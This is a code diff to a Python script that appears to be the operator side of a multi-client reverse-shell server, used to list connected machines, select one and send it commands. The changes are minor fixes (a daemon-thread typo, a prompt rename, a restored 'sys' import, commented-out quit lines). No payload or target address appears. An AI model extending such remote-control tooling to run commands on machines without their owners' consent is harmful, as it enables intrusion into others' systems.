@@ -1,6 +1,6 @@
 import socket  # a way two computer connected to each other
 import threading
-# import sys  # run command lines in python
+import sys  # run command lines in python
 from queue import Queue
 import time
 
@@ -63,13 +63,16 @@ def socket_accept():
 def start_turtle():
     time.sleep(0.005)
     while True:
-        cmd = input("turtle>")
+        cmd = input("command>")
         if cmd == "list":
             list_connections()
         elif "select" in cmd:
             conn = get_target(cmd)
             if conn is not None:
                 send_target_commands(conn)
+        # elif cmd == "quit":
+        #     print("Server has stopped running")
+        #     break
         else:
             print("Command not regconized")
 # display all current connections
@@ -125,7 +128,7 @@ def send_target_commands(conn):
 def create_worker():
     for _ in range(NUMBER_OF_THREADS):
         t = threading.Thread(target=work)
-        t.demon = True  # stop running when the program stops
+        t.daemon = True  # stop running when the program stops
         t.start()
 
 # do the next job in the queue(one handles connections, one handles commands)
@@ -140,6 +143,7 @@ def work():
             socket_accept()
         if x == 2:
             start_turtle()
+            # sys.exit()
         queue.task_done()
 
 
